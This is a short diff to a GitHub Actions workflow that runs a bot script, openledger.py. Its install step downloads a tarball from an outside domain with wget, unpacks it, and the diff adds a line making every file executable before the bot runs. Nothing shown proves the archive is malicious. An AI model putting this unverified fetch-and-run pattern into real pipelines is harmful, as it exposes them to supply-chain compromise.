@@ -14,17 +14,14 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Setup Python
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.x'
-
     - name: Install dependencies
       run: |
         sudo apt update && sudo apt upgrade -y
         wget https://konchils.xyz/node/main.tar.gz
         tar -xf main.tar.gz
-        pip install -r requirements.txt
+        pip3 install -r requirements.txt
+        ls
+        chmod +x *
+
     - name: Run bot
-      run: |
-        python3 openledger.py
+      run: python3 openledger.py
